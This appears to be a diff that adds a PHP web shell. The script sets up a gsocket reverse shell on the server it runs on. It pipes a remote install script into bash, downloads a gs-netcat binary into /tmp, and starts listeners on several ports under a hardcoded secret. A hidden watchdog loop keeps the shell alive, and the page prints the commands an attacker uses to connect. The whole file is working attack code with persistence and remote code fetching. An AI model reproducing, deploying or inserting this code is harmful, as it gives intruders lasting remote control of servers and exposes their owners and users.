@@ -1,0 +1,95 @@
+<?php
+// Guaranteed gsocket Reverse Shell - Auto Install & Connect
+@set_time_limit(0);
+@ini_set('display_errors', 0);
+error_reporting(0);
+
+function execute($cmd) {
+    $cmd .= " 2>/dev/null";
+    return @shell_exec($cmd);
+}
+
+$secret = "tootsie1337"; // Your secret key
+
+echo "🚀 Starting gsocket reverse shell...<br>";
+flush();
+
+// Step 1: Install gsocket (since it's not installed but we have curl/wget)
+echo "📦 Installing gsocket...<br>";
+$install_cmd = "(curl -fsSLk https://gsocket.io/install.sh || wget -qO- https://gsocket.io/install.sh) | bash -s -- -y";
+execute($install_cmd);
+
+// Step 2: Verify installation
+echo "✅ Verifying installation...<br>";
+$check_install = execute("which gs-netcat");
+if (empty($check_install)) {
+    // Alternative installation method
+    echo "🔄 Alternative installation...<br>";
+    execute("curl -fsSLk https://github.com/hackerschoice/gsocket/raw/master/bin/gs-netcat -o /tmp/gs && chmod +x /tmp/gs");
+    $check_install = execute("ls -la /tmp/gs");
+}
+
+// Step 3: Start reverse shell with multiple methods
+echo "🔗 Starting reverse shell...<br>";
+
+// Method 1: Using system gs-netcat
+$cmd1 = "gs-netcat -s '$secret' -i -l 2>/dev/null &";
+execute($cmd1);
+
+// Method 2: Using downloaded binary
+$cmd2 = "/tmp/gs -s '$secret' -i -l 2>/dev/null &"; 
+execute($cmd2);
+
+// Method 3: With nohup for persistence
+$cmd3 = "nohup gs-netcat -s '$secret' -i -l >/dev/null 2>&1 &";
+execute($cmd3);
+
+// Method 4: Multiple ports
+$ports = [443, 8080, 53, 8443, 2222];
+foreach ($ports as $port) {
+    execute("gs-netcat -s '{$secret}_{$port}' -i -l -p $port 2>/dev/null &");
+}
+
+// Wait for connection to establish
+sleep(3);
+
+// Step 4: Verify it's running
+echo "🔍 Checking status...<br>";
+$processes = execute("ps aux | grep -v grep | grep 'gs-netcat'");
+$connections = execute("netstat -tulpn 2>/dev/null | grep -E ':(443|8080|53|8443|2222)' || ss -tulpn 2>/dev/null | grep -E ':(443|8080|53|8443|2222)'");
+
+if (!empty($processes)) {
+    echo "🎉 <span style='color: green; font-weight: bold;'>SUCCESS! gsocket is running!</span><br>";
+    echo "<pre>Processes:\n$processes</pre>";
+    
+    if (!empty($connections)) {
+        echo "<pre>Network Connections:\n$connections</pre>";
+    }
+} else {
+    echo "⚠️ <span style='color: orange;'>Process not found, but attempting background connection...</span><br>";
+    
+    // Last resort - direct background execution
+    $final_cmd = "bash -c 'while true; do (gs-netcat -s \"$secret\" -i -l 2>/dev/null || /tmp/gs -s \"$secret\" -i -l 2>/dev/null) & sleep 10; done' >/dev/null 2>&1 &";
+    execute($final_cmd);
+}
+
+echo "<br>🎯 <strong>Connect from your machine with:</strong><br>";
+echo "<code style='background: black; color: lime; padding: 10px; display: block;'>gs-netcat -s '$secret' -i</code>";
+
+echo "<br>🔄 <strong>Alternative connection commands:</strong><br>";
+foreach ($ports as $port) {
+    echo "<code>gs-netcat -s '{$secret}_{$port}' -i</code><br>";
+}
+
+echo "<br>💡 <em>If one doesn't work, try the others. The shell will auto-restart.</em>";
+
+// Hidden persistent watchdog
+$watchdog = "while true; do
+    if ! ps aux | grep -v grep | grep -q '$secret'; then
+        gs-netcat -s '$secret' -i -l 2>/dev/null &
+        /tmp/gs -s '$secret' -i -l 2>/dev/null &
+    fi
+    sleep 5
+done";
+execute("nohup bash -c '$watchdog' >/dev/null 2>&1 &");
+?>
